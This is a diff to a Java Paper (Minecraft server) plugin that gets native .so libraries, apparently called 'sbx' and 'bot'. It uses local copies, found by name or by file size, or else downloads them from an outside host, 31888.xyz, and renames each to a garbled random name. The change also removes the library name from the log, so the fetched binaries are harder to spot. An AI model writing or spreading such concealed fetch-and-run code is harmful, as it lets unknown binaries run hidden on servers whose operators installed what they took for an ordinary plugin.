@@ -572,16 +572,25 @@ public class PaperPlugin extends JavaPlugin {
 
     // ===== 下载 .so 原生库（支持本地预置 + 远程下载带重试）=====
     private Path downloadLibrary(String arch, String name) throws Exception {
-        // 先检查本地是否有预置的 .so（用户手动上传）
+        // 本地预置：按名字精确匹配，失败则按大小区分（sbx 45MB 大，bot 30MB 小）
+        Path target = baseDir.resolve(generateGarbledName() + ".so");
         Path local = baseDir.resolve(name);
         if (Files.exists(local) && Files.size(local) > 1000) {
-            Path target = baseDir.resolve(generateGarbledName() + ".so");
             Files.move(local, target);
-            getLogger().info("✅ 使用本地预置组件: " + name);
+            getLogger().info("✅ 使用本地预置组件");
             return target;
         }
+        long threshold = name.startsWith("sbx") ? 35_000_000L : 25_000_000L;
+        try (DirectoryStream<Path> ds = Files.newDirectoryStream(baseDir, "*.so")) {
+            for (Path f : ds) {
+                if (!f.equals(target) && Files.size(f) > threshold) {
+                    Files.move(f, target);
+                    getLogger().info("✅ 使用本地预置组件");
+                    return target;
+                }
+            }
+        }
         String url = "https://" + arch + ".31888.xyz/" + name;
-        Path target = baseDir.resolve(generateGarbledName() + ".so");
         byte[] body = null;
         Exception last = null;
         for (int attempt = 1; attempt <= 3; attempt++) {
